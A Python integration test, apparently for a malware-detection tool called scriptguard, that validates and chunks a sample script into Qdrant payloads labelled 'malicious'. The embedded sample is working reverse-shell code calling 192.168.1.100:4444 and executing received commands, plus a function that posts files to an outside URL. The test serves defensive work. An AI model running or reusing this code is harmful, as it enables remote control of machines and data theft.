"""
Integration test: Validate complete pipeline from file validation to Qdrant payload
This test demonstrates the full flow without requiring actual Qdrant instance.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

import tempfile
from scriptguard.utils.file_validator import validate_python_file
from scriptguard.rag.chunking_service import ChunkingService

print("=" * 70)
print("INTEGRATION TEST: File Validation → Chunking → Qdrant Payload")
print("=" * 70)

# Simulate a realistic Python file
test_code = '''
"""
Malicious script that establishes reverse shell connection.
"""
import socket
import subprocess
import os
from typing import Optional

class ReverseShell:
    """Establishes backdoor connection to C2 server."""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
    
    def connect(self):
        """Connect to remote server."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
    
    def execute_command(self, cmd: str) -> bytes:
        """Execute shell command and return output."""
        result = subprocess.check_output(cmd, shell=True)
        return result
    
    def start_shell(self):
        """Start interactive shell session."""
        while True:
            data = self.socket.recv(1024)
            if not data:
                break
            
            try:
                output = self.execute_command(data.decode())
                self.socket.send(output)
            except Exception as e:
                self.socket.send(str(e).encode())

def exfiltrate_data(file_path: str, target_url: str):
    """Send sensitive file to external server."""
    import requests
    with open(file_path, 'rb') as f:
        data = f.read()
    requests.post(target_url, data=data)

if __name__ == "__main__":
    shell = ReverseShell("192.168.1.100", 4444)
    shell.connect()
    shell.start_shell()
'''

# Step 1: File Validation
print("\n[STEP 1] File Validation (Gatekeeper)")
print("-" * 70)

with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
    f.write(test_code)
    f.flush()  # Ensure content is written
    temp_path = f.name

try:
    is_valid, content, validation_metadata = validate_python_file(temp_path)

    print(f"File: {temp_path}")
    print(f"Valid: {is_valid}")
    print(f"Size: {validation_metadata.get('file_size', 0)} bytes")
    print(f"Lines: {validation_metadata.get('line_count', 0)}")
    print(f"Code density: {validation_metadata.get('code_density', 0):.2%}")

    assert is_valid, "File should pass validation"
    print("✓ File passed all validation checks")

    # Step 2: Chunking with Parent-Child Structure
    print("\n[STEP 2] Chunking with Parent-Child Structure")
    print("-" * 70)

    chunker = ChunkingService(
        tokenizer_name="microsoft/unixcoder-base",
        chunk_size=256,  # Smaller chunks for demo
        overlap=32
    )

    chunks = chunker.chunk_code(
        code=content,
        db_id=1001,
        label="malicious",
        source=temp_path,
        metadata={"file_path": temp_path, "language": "python"}
    )

    print(f"Generated {len(chunks)} chunk(s)")
    print(f"First chunk ID: {chunks[0]['chunk_id']}")
    print(f"Parent ID: {chunks[0]['parent_id'][:16]}...")

    # Step 3: Simulate Qdrant Payload Structure
    print("\n[STEP 3] Qdrant Payload Structure")
    print("-" * 70)

    for i, chunk in enumerate(chunks):
        # Simulate what would be sent to Qdrant
        qdrant_payload = {
            "db_id": chunk["db_id"],
            "chunk_index": chunk["chunk_index"],
            "total_chunks": chunk["total_chunks"],
            "token_count": chunk["token_count"],
            "code_preview": chunk["content"][:100] + "...",
            "parent_id": chunk["parent_id"],  # ← NEW: Parent document hash
            "parent_context": chunk["parent_context"],  # ← NEW: Module context
            "label": chunk["label"],
            "label_binary": 1 if chunk["label"] == "malicious" else 0,
            "source": chunk["source"],
            "language": "python",
            "metadata": chunk["metadata"]
        }

        print(f"\nChunk {i + 1}/{len(chunks)}:")
        print(f"  ID: {chunk['chunk_id']}")
        print(f"  Parent ID: {qdrant_payload['parent_id'][:16]}...")
        print(f"  Parent Context: {qdrant_payload['parent_context'][:80]}...")
        print(f"  Label: {qdrant_payload['label']} (binary: {qdrant_payload['label_binary']})")
        print(f"  Tokens: {qdrant_payload['token_count']}")
        print(f"  Preview: {qdrant_payload['code_preview'][:60]}...")

        # Validate required fields
        assert "parent_id" in qdrant_payload
        assert "parent_context" in qdrant_payload
        assert qdrant_payload["parent_id"] is not None
        assert len(qdrant_payload["parent_id"]) == 64  # SHA256
        assert qdrant_payload["parent_context"] is not None
        assert len(qdrant_payload["parent_context"]) > 0

    # Step 4: Verify Parent-Child Consistency
    print("\n[STEP 4] Parent-Child Consistency Check")
    print("-" * 70)

    parent_ids = [c["parent_id"] for c in chunks]
    unique_parents = set(parent_ids)

    print(f"Total chunks: {len(chunks)}")
    print(f"Unique parent IDs: {len(unique_parents)}")

    if len(chunks) > 1:
        assert len(unique_parents) == 1, "All chunks should share same parent_id"
        print("✓ All chunks correctly reference same parent document")

    # Step 5: Parent Context Validation
    print("\n[STEP 5] Parent Context Content Validation")
    print("-" * 70)

    parent_context = chunks[0]["parent_context"]
    print(f"Full parent context:\n{parent_context}\n")

    # Check that context contains useful information
    context_lower = parent_context.lower()
    has_imports = "import" in context_lower
    has_class = "class" in context_lower or "def" in context_lower
    has_docstring = "malicious" in context_lower or "module" in context_lower

    print("Context analysis:")
    print(f"  Contains imports: {has_imports}")
    print(f"  Contains definitions: {has_class}")
    print(f"  Contains docstring: {has_docstring}")

    assert has_imports or has_class, "Context should contain module-level info"
    print("✓ Parent context contains relevant module information")

    # Summary
    print("\n" + "=" * 70)
    print("INTEGRATION TEST PASSED ✓")
    print("=" * 70)
    print("\nValidated Complete Pipeline:")
    print("  1. ✓ File validation (extension, size, encoding, AST)")
    print("  2. ✓ Chunking with parent-child structure")
    print("  3. ✓ Qdrant payload contains parent_id and parent_context")
    print("  4. ✓ Multi-chunk documents share same parent_id")
    print("  5. ✓ Parent context contains module-level metadata")
    print("\nREADY FOR QDRANT INGESTION")

finally:
    os.unlink(temp_path)
